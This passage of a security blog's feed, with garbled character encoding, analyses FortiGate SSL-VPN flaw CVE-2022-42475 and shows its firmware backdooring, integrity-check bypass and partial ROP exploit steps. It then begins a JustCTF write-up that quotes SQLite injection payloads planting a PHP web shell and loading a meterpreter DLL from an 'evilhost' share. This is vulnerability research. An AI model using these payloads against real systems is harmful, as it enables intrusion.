href="https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/#:~:text=The%20crash%20happened%20in">attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn</a><br>^[4] <a href="https://github.dev/openssl/openssl/tree/openssl-3.0.0%E2%89%A5">https://github.dev/openssl/openssl/tree/openssl-3.0.0â‰¥</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
    <summary type="html">CVE-2023-27997</summary>
    
    
    
    <category term="æ¼æ´åˆ†æ" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="CVE-2023-27997" scheme="https://bestwing.me/tags/CVE-2023-27997/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow</title>
    <link href="https://bestwing.me/CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow.html"/>
    <id>https://bestwing.me/CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow.html</id>
    <published>2023-06-17T16:00:00.000Z</published>
    <updated>2023-06-28T10:20:57.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>åŸæ–‡é“¾æ¥ï¼š<a href="https://bestwing.me/CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow.html">https://bestwing.me/CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow.html</a></p><h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h2><p>è¿™ä¸¤å¤©å’Œ @leommxj ä¸€èµ·åˆ†æäº†å’Œå†™äº†ä¸€ä¸‹  CVE-2023-27997 çš„æ¼æ´åˆ©ç”¨ï¼Œ é¡ºä¾¿ä¸€æƒ³æƒ³ CVE-2022-42475 è¿™ä¸ªæ¼æ´ä¹Ÿè¿‡å»è›®ä¹…çš„äº†ï¼Œäºæ˜¯å‡†å¤‡æŠŠè¿™ç¯‡ CVE-2022-42475 æ¼æ´åˆ†æåˆ†äº«å‡ºæ¥ã€‚æ³¨ï¼šæœ¬æ–‡ä¸å«å®Œæ•´çš„æ¼æ´åˆ©ç”¨è„šæœ¬ã€‚</p><p>ä¸‹å›¾ä¸º CVE-2023-27997  çš„åˆ©ç”¨å½•å±ï¼Œ ä¸æœ¬æ–‡è¦è®²çš„ CVE-2022-42475  æ— å…³</p><blockquote class="twitter-tweet"><p lang="en" dir="ltr">I learned a lot from <a href="https://twitter.com/cfreal_?ref_src=twsrc%5Etfw">@cfreal_</a> , and it&#39;s great to write exploits together with <a href="https://twitter.com/leommxj?ref_src=twsrc%5Etfw">@leommxj</a>.<a href="https://twitter.com/hashtag/CVE?src=hash&amp;ref_src=twsrc%5Etfw">#CVE</a>-2023-27997 <a href="https://t.co/nEFndgvoVD">pic.twitter.com/nEFndgvoVD</a></p>&mdash; swing (@bestswngs) <a href="https://twitter.com/bestswngs/status/1669969165392953344?ref_src=twsrc%5Etfw">June 17, 2023</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><p>æ³¨ï¼šè¿™ç¯‡ç¬”è®°æˆæ–‡äº 2023-02-28 ï¼Œ å‘è¡¨äº 2023-06-18</p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>2022 å¹´ 12 æœˆ 12 æ—¥ï¼ŒFortinet å®˜æ–¹å‘å¸ƒäº†å½±å“ FortiGate SSLVPN çš„ RCE æ¼æ´ CVE-2022-42475 ç›¸å…³ä¿¡æ¯ã€‚æœ¬æ–‡å¯¹æ­¤æ¼æ´çš„æˆå› è¿›è¡Œåˆ†æã€‚</p><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><p>æµ‹è¯•ç‰ˆæœ¬ä¸º 7.2.2ï¼Œ ç¯å¢ƒçš„å®‰è£…å’Œéƒ¨ç½²å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š  <a href="https://blog.csdn.net/meigang2012/article/details/87903878%E3%80%82">https://blog.csdn.net/meigang2012/article/details/87903878ã€‚</a> å¦å¤–æ„Ÿè°¢ä¸‹ @explorer ç½‘ç®¡å¤§å“¥åœ¨éƒ¨ç½²ç¯å¢ƒä¸Šçš„å¸®åŠ©ã€‚</p><p>å¯¼å…¥è™šæ‹Ÿæœºåéœ€è¦é…ç½®ä¸‹ç½‘ç»œï¼Œ å‚è€ƒ <a href="https://docs.fortinet.com/document/fortigate-private-cloud/7.2.0/vmware-esxi-administration-guide/615472/configuring-port-1">https://docs.fortinet.com/document/fortigate-private-cloud/7.2.0/vmware-esxi-administration-guide/615472/configuring-port-1</a></p><p>æœ‰ä¸ªé‡ç‚¹ dns è¦è®¾ç½®ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">config system dns</span><br><span class="line"><span class="built_in">set</span> primary &lt;Primary DNS server&gt;</span><br><span class="line"><span class="built_in">set</span> secondary &lt;Secondary DNS server&gt;</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="comment"># The default DNS servers are 208.91.112.53 and 208.91.112.52.</span></span><br></pre></td></tr></table></figure><p>éœ€è¦é…ç½®ä¸€ä¸ª sslvpn ï¼Œç„¶åèƒ½è®¿é—®å³å¯ã€‚</p><h2 id="è®¾å¤‡æƒé™è·å–"><a href="#è®¾å¤‡æƒé™è·å–" class="headerlink" title="è®¾å¤‡æƒé™è·å–"></a>è®¾å¤‡æƒé™è·å–</h2><p>æŒ‚è½½è™šæ‹Ÿæœº vmdk ç¡¬ç›˜åï¼Œ å¯ä»¥çœ‹åˆ°æœ‰ä¸ª rootfs.gz æ–‡ä»¶ã€‚ </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Jas-22:/home/user/Desktop/fuck-fortigate/rootfs<span class="comment"># ls</span></span><br><span class="line">bin  bin.tar.xz  boot  data  data2  dev  etc  fortidev  init  lib  lib64  migadmin.tar.xz  node-scripts.tar.xz  proc  sbin  sys  tmp  usr  usr.tar.xz  usr.tar.xz.chk  var</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰å¦‚ä¸‹å†…å®¹ï¼Œ æˆ‘ä»¬éœ€è¦è¿›ä¸€æ­¥è§£å‹  <code>bin.tar.xz</code> æ–‡ä»¶å¤¹ï¼Œä½¿ç”¨ sbin ç›®å½•è‡ªå¸¦çš„å‘½ä»¤è§£å‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chroot . /sbin/xz --check=sha256 -d /bin.tar.xz</span><br><span class="line">chroot . /sbin/ftar -xf /bin.tar</span><br><span class="line">chroot . /sbin/xz --check=sha256 -d /migadmin.tar.xz</span><br><span class="line">chroot . /sbin/ftar -xf /migadmin.tar</span><br></pre></td></tr></table></figure><p>ç„¶åéœ€è¦åœ¨ bin ç›®å½•ä¸­æ”¾å…¥åé—¨ï¼Œç¬¬ä¸€ä¸ªæ˜¯ç”Ÿæˆä¸€ä¸ªåå¼¹shellæ›¿æ¢  smartctl æ–‡ä»¶ï¼Œ ä»¥åŠæˆ‘è¿™é‡Œæ”¾å…¥ä¸€ä¸ª busybox ï¼Œåšä¸€ä¸ªè½¯é“¾æ¥ <code>ln -sn /bin/busybox bin/sh</code> è®¾å¤‡ä¸­é»˜è®¤æ²¡æœ‰  bash ï¼ˆshï¼‰æ–‡ä»¶ ï¼ˆæˆ–è€…è¯´ä»–çš„ sh åŠŸèƒ½æ¯”è¾ƒé¸¡è‚‹ï¼‰ï¼Œ ç„¶åé‡æ–°æ‰“åŒ…ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é‡æ–°æ‰“åŒ… bin æ–‡ä»¶å¤¹</span></span><br><span class="line">chroot . sbin/ftar -cf bin.tar bin</span><br><span class="line">chroot . sbin/xz --check=sha256 -e bin.tar</span><br><span class="line"><span class="comment"># é‡æ–°æ‰“åŒ… rootfs</span></span><br><span class="line">find . | cpio -H newc -o &gt; ../rootfs.raw</span><br><span class="line">cat ./rootfs.raw | gzip &gt; rootfs.gz</span><br></pre></td></tr></table></figure><p>é‡æ‰“åŒ…å®Œæˆåï¼Œ æˆ‘ä»¬éœ€è¦è¿‡å‡ ä¸ªæ ¡éªŒï¼Œæ‰èƒ½æ­£å¸¸å¯åŠ¨ç³»ç»Ÿã€‚</p><p>vmlinux ï¼š </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-03-6dbab4847a64cb84dff1b31c4e8e49b1-302eb4.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-03-6dbab4847a64cb84dff1b31c4e8e49b1-302eb4.png"></a></p><p>è§£ä¸‹æ¥æ˜¯ bin/initï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-03-c887601385826f00ca523269f2551e12-419102.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-03-c887601385826f00ca523269f2551e12-419102.png"></a></p><p>è¿™é‡Œä¼šæ ¡éªŒ fgtsum ï¼Œ å¤±è´¥ç›´æ¥ç»™ä½ é‡å¯æœ€åæ˜¯ rootfs æ£€æŸ¥</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-03-b76899fa4e7c4c68e04166ca06b38b05-3f7506.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-03-b76899fa4e7c4c68e04166ca06b38b05-3f7506.png"></a></p><p>ç”±äºï¼Œæˆ‘æ˜¯é‡‡ç”¨ vmware +  gdb çš„è°ƒè¯•æ–¹å¼ï¼Œ å³ <a href="https://bestwing.me/Linux_Kernel_Debugging_with_VMware_and_GDB.html">ä½¿ç”¨VMwareå’ŒGDBè¿›è¡ŒLinuxå†…æ ¸è°ƒè¯• (bestwing.me)</a>ï¼Œ å› æ­¤æˆ‘ç›´æ¥å†™äº†ä¸€ä¸ª gdb python è„šæœ¬åŠ¨æ€ä¿®æ”¹è¿”å›å€¼å³å¯ï¼š</p><blockquote><p>è¿™é‡Œçš®ä¸€å¥ï¼Œä¾ç¨€è®°å¾—è¿™æ®µä»£ç æ˜¯ chatGPT å¸®æˆ‘ç”Ÿæˆçš„ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SetRaxBreakpoint</span>(<span class="params">gdb.Breakpoint</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, bp_expr, rax_value, temporary=False</span>):</span></span><br><span class="line">        gdb.Breakpoint.__init__(self, bp_expr, gdb.BP_BREAKPOINT, <span class="literal">False</span>, temporary )</span><br><span class="line">        <span class="comment"># super(SetRaxBreakpoint, self).__init__(spec, temporary)</span></span><br><span class="line">        self.rax_value = rax_value</span><br><span class="line">        self.silent = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stop</span>(<span class="params">self</span>):</span></span><br><span class="line">        gdb.execute(<span class="string">&#x27;set $rax = &#123;&#125;&#x27;</span>.format(self.rax_value))</span><br><span class="line"></span><br><span class="line">gdb.execute(<span class="string">&#x27;set architecture i386:x86-64&#x27;</span>)</span><br><span class="line">gdb.execute(<span class="string">&#x27;set pagination off&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r1 = SetRaxBreakpoint(<span class="string">&#x27;*0xffffffff807ac11c&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">r2 = SetRaxBreakpoint(<span class="string">&#x27;*0x4518C9&#x27;</span>, <span class="number">1</span>) <span class="comment"># </span></span><br><span class="line">r3 = SetRaxBreakpoint(<span class="string">&#x27;*0x277fccc&#x27;</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>å½“ç³»ç»ŸæˆåŠŸæ‰§è¡Œåï¼Œä½¿ç”¨ <code>diagnose hardware smartctl </code> å³å¯è¿è¡Œæˆ‘ä»¬çš„åé—¨æ–‡ä»¶ã€‚</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>åœ¨å¤„ç†ç”¨æˆ· POST æ•°æ®çš„æ—¶å€™ï¼Œ </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-f8922630b29d5da26852daf138d53568-c35f78.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-f8922630b29d5da26852daf138d53568-c35f78.png"></a></p><p>ä¼šæ ¹æ® http header ä¸­çš„  <code>content-length</code>å­—æ®µåˆ†é… buffer ï¼Œ ç„¶è€Œåœ¨åˆ†é…ä¹‹å‰ï¼Œ å³åœ¨è°ƒç”¨ pool_alloc å‡½æ•°ä¹‹å‰</p><blockquote><p> pool_alloc æœ‰ä¸¤ä¸ªå‚æ•°,  ç¬¬äºŒä¸ªä¸ºå³å°†è¦åˆ†é…çš„buffer å¤§å°</p></blockquote><p>rax ä¸ºç”¨æˆ·è¯·æ±‚ç»“æ„ä½“æŒ‡é’ˆï¼Œåç§»ä½ç½® 0x18 å­˜æ”¾äº† CL å€¼ã€‚å…ˆå°† CL æ”¾åœ¨ eax å¯„å­˜å™¨ä¸­ï¼Œä½¿ç”¨ lea æŒ‡ä»¤å°†å…¶åŠ ä¸€åæ”¾åœ¨ esi å¯„å­˜å™¨ï¼Œå†ç”¨ movsxd æ‰©å±•ä¸º 64 bit å€¼ã€‚</p><p>åœ¨è°ƒç”¨ pool_alloc å‡½æ•°æ—¶ä½¿ç”¨ 32 ä½æ•°å€¼ + 1 æ‹“å±•æˆ 64 ä½çš„æ–¹æ³•ï¼Œè¿™é‡Œå­˜åœ¨æ•´æ•°æº¢å‡ºã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€ ç‰¹æ®Šçš„ CL å€¼ï¼Œæ¯”å¦‚ 0x1b00000000ï¼Œç»è¿‡è¿ç®—æ‹“å±•ä¹‹åä¼šå˜æˆ 0x1 ã€‚ä¼šåˆ†é…ä¸€ä¸ªå°çš„å†…å­˜ç©ºé—´å¯¼è‡´æº¢å‡º</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-128350f0bec9a51748ab3b63b116a7ce-981162.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-128350f0bec9a51748ab3b63b116a7ce-981162.png"></a></p><p>ä¸Šé¢è¿™ä¸ªæ˜¯æ–­ç‚¹æ˜¯åˆå§‹åŒ– buffer ï¼Œ å¯ä»¥çœ‹åˆ°å¤§å°æ˜¯ 1,  ä¹‹ååœ¨ memcpy å¤„å°± ä¼šæº¢å‡ºã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-6b4a0c20901bb1fb02d0126a5149423b-28adec.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-6b4a0c20901bb1fb02d0126a5149423b-28adec.png"></a></p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p>è¿™é‡Œé¦–å…ˆæ˜ç¡®ä¸€ä¸‹ï¼Œæˆ‘ä¸ä¼šå…¬å¼€å®Œæ•´çš„åˆ©ç”¨ï¼Œè¿™é‡Œè¿™æä¸€ç‚¹åˆ©ç”¨ä¸Šçš„æ€è·¯ã€‚åˆ©ç”¨æ•´ä½“æ€è·¯å‚è€ƒ Orange 2017 å¹´çš„æ–‡ç« ï¼Œ å¤§è‡´æ€è·¯å°±æ˜¯è¿›è¡Œè¿›è¡Œç«äº‰ï¼Œ ä¸€è¾¹åœ¨å †ä¸Šå¸ƒå±€ SSL ç»“æ„ä½“ï¼Œä¸€è¾¹è§¦å‘æ¼æ´ï¼Œç„¶åæº¢å‡ºè¦†ç›– SSL ç»“æ„ä½“ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-da548c387796e997639b84cc9298d0d2-3fc09e.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-da548c387796e997639b84cc9298d0d2-3fc09e.png"></a></p><p>ä¹‹åå°±å¯ä»¥æ§åˆ¶ PC ï¼Œ å½“æˆ‘ä»¬æ§åˆ¶ PC åæˆ‘ä»¬éœ€è¦ç¡®å®š padding ï¼Œ è¿™ä¸ªæ­¥éª¤æ¯”è¾ƒç¹çï¼Œ æˆ‘æ‹¿ PoC æ”¹äº†ä¸€ä¸ªå¾ªç¯ fuzz çš„è„šæœ¬ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_exploit</span>(<span class="params">padding</span>):</span></span><br><span class="line"> ...</span><br><span class="line"> payload = p64(ret) * padding + <span class="string">&#x27;A&#x27;</span> * <span class="number">0x1000</span></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">123</span>, <span class="number">384</span>):</span><br><span class="line">    padding = int(i )</span><br><span class="line">    <span class="keyword">if</span> do_exploit(padding):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;timeout ...&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ç„¶åå¯¹ ret è¿™ä¸ªgadget ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œ å½“è§¦å‘æ–­ç‚¹çš„æ—¶å€™ï¼Œ è„šæœ¬ä¼šå› ä¸ºtimeout  è§¦å‘å¼‚å¸¸ï¼Œç„¶åè¿™é™„è¿‘å¤§æ¦‚å°±æ˜¯å’±ä»¬çš„paddingã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-4f7aaf1a3306a4fe035b064f9bcd4e21-284979.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-4f7aaf1a3306a4fe035b064f9bcd4e21-284979.png"></a></p><p>ç„¶åè¿™ä¸ªæ—¶å€™åªéœ€è¦æ‰¾æ ˆè¿ç§»çš„gadget å³å¯ã€‚è¿™é‡Œæˆ‘æ‰¾äº†çš„ <code> push rdx ; add bl, byte ptr [rbx + 0x41] ; pop rsp ; pop rbp ; ret</code> ï¼Œ è¿™ä¸ªgadget ï¼Œ æ­£å¥½å¯ä»¥å°†æ ˆè¿ç§»åˆ°  rdi å¯„å­˜å™¨æ‰€æŒ‡å‘çš„å†…å­˜åœ°å€ä¸Šã€‚ç„¶åå°†å‰©ä¸‹ ret æŒ‡ä»¤çš„æ›¿æ¢æˆ <code>pop rax ; ret</code><br>è¿™æ ·çš„gadgetï¼Œ è¿™æ ·å°±èƒ½ä¸€ç›´è¿ç§»åˆ°å¯æ§åˆ¶çš„ <code>AAAAAAA</code> çš„åœ°æ–¹è¿›è¡Œ rop é“¾äº†ã€‚</p><blockquote><p>å†é˜…è¯»è¿™ä¸€éƒ¨åˆ†çš„å†…å®¹ï¼Œæˆ‘çªç„¶ååº”è¿‡æ¥å…¶å®ä¸éœ€è¦æ›¿æ¢æŒ‡ä»¤ï¼Œ å½“å‰çš„ ret æŒ‡ä»¤å°±è¶³å¤Ÿè¿ç§»åˆ°å¯æ§çš„ <code>AAAA</code> çš„ä½ç½®è¿›è¡Œ ROP äº†</p></blockquote><p>ç”±äº fortigate çš„è¿™ä¸ªç¨‹åºå¾ˆå¤§ï¼Œæ­£å¦‚ <a href="https://twitter.com/hashtag/CVE?src=hashtag_click">CVE</a>-2023-27997 çš„ä½œè€…æ‰€è¯´çš„ï¼Œ</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-18-052405000e893e38eafc4cdbda2afe2c-4a9f3b.png" title="image-20230618171021882" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-18-052405000e893e38eafc4cdbda2afe2c-4a9f3b.png" alt="image-20230618171021882"></a></p><p>è¯¥ç¨‹åºå¾ˆå¤§ï¼Œæƒ³æ‰¾åˆ°é€‚åˆçš„ gadget æ¥ç»„æˆ ropchain ä»…ä»…éœ€è¦èŠ±è´¹ä¸€ç‚¹æ—¶é—´å°±è¡Œäº†ã€‚</p><h2 id="å‚è€ƒè¿æ¥"><a href="#å‚è€ƒè¿æ¥" class="headerlink" title="å‚è€ƒè¿æ¥"></a>å‚è€ƒè¿æ¥</h2><p><a href="https://blog.csdn.net/meigang2012/article/details/87903878">é£å¡”è€æ¢…å­çš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://docs.fortinet.com/document/fortigate-private-cloud/7.2.0/vmware-esxi-administration-guide/615472/configuring-port-1">Configuring port 1 | FortiGate Private Cloud 7.2.0 (fortinet.com)</a></p><p><a href="https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/">attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn</a></p><p><a href="https://bestwing.me/Linux_Kernel_Debugging_with_VMware_and_GDB.html">ä½¿ç”¨VMwareå’ŒGDBè¿›è¡ŒLinuxå†…æ ¸è°ƒè¯• (bestwing.me)</a></p><p><a href="https://wzt.ac.cn/2022/12/15/CVE-2022-42475/">CVE-2022-42475 | CataLpaâ€™s Site (wzt.ac.cn)</a></p><p><a href="https://www.cnblogs.com/studyskill/p/6524672.html">fortios 5.4åé—¨æ¤å…¥</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
    <summary type="html">CVE-2022-42475</summary>
    
    
    
    <category term="æ¼æ´åˆ†æ" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="CVE-2022-42475" scheme="https://bestwing.me/tags/CVE-2022-42475/"/>
    
  </entry>
  
  <entry>
    <title>ä»JustCTF 2023 ä¸­å­¦åˆ°çš„ä¸€ç‚¹å…³äº sqlite3 ä»£ç æ‰§è¡Œçš„æ–¹æ³•</title>
    <link href="https://bestwing.me/How-to-hacked-sqlite.html"/>
    <id>https://bestwing.me/How-to-hacked-sqlite.html</id>
    <published>2023-06-04T16:00:00.000Z</published>
    <updated>2023-06-06T01:21:36.049Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h1><p>å‘¨æœ«ç®€å•çœ‹äº†ä¸‹ JustCTF 2023 çš„é¢˜ç›®ï¼Œ ä¸»è¦æ˜¯ä¸‰ä¸ªé¢˜ç›®å¸å¼•äº†æˆ‘çš„æ³¨æ„ï¼Œ åˆ†åˆ«æ˜¯ notabug ã€notabug2 å’ŒWindytoothã€‚ å…¶ä¸­å‰é¢ä¸¤ä¸ªæ˜¯å’Œ sqlite3 ç›¸å…³çš„é¢˜ç›®ã€‚å†æ¬¡å­¦åˆ°äº†ä¸€ç‚¹åˆ©ç”¨æ–¹å¼ã€‚</p><h3 id="Known-Attacks-on-SQLite"><a href="#Known-Attacks-on-SQLite" class="headerlink" title="Known Attacks on SQLite"></a>Known Attacks on SQLite</h3><p>åœ¨BlackHat 2017 é•¿äº­ç§‘æŠ€çš„ slide ä¸­æåˆ°ä¸¤ç§ä¼—æ‰€å‘¨çŸ¥çš„æ–¹æ³•ï¼š <a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf">^1</a></p><h4 id="Attach-Database"><a href="#Attach-Database" class="headerlink" title="Attach Database"></a>Attach Database</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;bob&#39;; ATTACH DATABASE &#39;&#x2F;var&#x2F;www&#x2F;lol.php&#39; AS lol; CREATE TABLE lol.pwn </span><br><span class="line">(dataz text); INSERT INTO lol.pwn (dataz) VALUES (&#39;&lt;? system($_GET[&#39;cmd&#39;]); </span><br><span class="line">?&gt;&#39;;--</span><br></pre></td></tr></table></figure><p>é€šè¿‡å†™ <code>ATTACH DATABASE</code> å†™æ–‡ä»¶ï¼Œ ç„¶åæ‰§è¡Œ php ä»£ç </p><h4 id="SELECT-load-extension"><a href="#SELECT-load-extension" class="headerlink" title="SELECT load_extension"></a>SELECT load_extension</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;123 UNION SELECT </span><br><span class="line">1,load_extension(&#39;\\evilhost\evilshare\meterpreter.dll&#39;,&#39;DllMain&#39;);--</span><br></pre></td></tr></table></figure><p>åœ¨èƒ½ä¸Šä¼ æ–‡ä»¶çš„æƒ…å†µåœ¨ï¼Œ ä¸”åŠ è½½æ‰©å±•çš„åŠŸèƒ½å¿…é¡»æ‰“å¼€ <a href="https://www.sqlite.org/c3ref/load_extension.html">^2</a> ã€‚åœ¨ JustCTF çš„ notabug ä¸­ä¹Ÿç”¨åˆ°è¿™ä¸ªæŠ€å·§</p><figure class="highlight python"><figcaption><span>title: "exploit for notabug (JustCTF 2023)"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]</span></span><br><span class="line"><span class="comment"># p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">p = remote(<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">13337</span>)</span><br><span class="line">ru         = <span class="keyword">lambda</span> a:     p.readuntil(a)</span><br><span class="line">r         = <span class="keyword">lambda</span> n:        p.read(n)</span><br><span class="line">sla     = <span class="keyword">lambda</span> a,b:     p.sendlineafter(a,b)</span><br><span class="line">sa         = <span class="keyword">lambda</span> a,b:     p.sendafter(a,b)</span><br><span class="line">sl        = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s         = <span class="keyword">lambda</span> a:     